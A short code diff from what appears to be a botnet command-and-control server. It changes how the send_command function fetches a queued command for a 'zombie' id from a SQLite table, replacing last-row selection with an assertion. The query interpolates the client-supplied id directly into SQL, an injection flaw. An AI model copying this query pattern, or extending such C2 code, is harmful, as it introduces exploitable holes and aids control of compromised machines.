@@ -65,8 +65,10 @@ def send_command(zid):
         # the zombie is known so get the command I've put for it.
         cur = conn.execute("select command from zombies where id='{}'".format(zid))
         res = cur.fetchall()
-        command = res[-1][0]
-        # Fetch the last command for the zombie from its own table and give it.
+        # if this assertion fails, there's is (some how) more than one zombie with the same id. That's not good.
+        assert(len(res)) == 1
+        command = res[0][0]
+        # Fetch the command i put for the zombie in the zombies table and give it.
         conn.close()
         print("the command is", command)
         print("the type of res is", type(res))
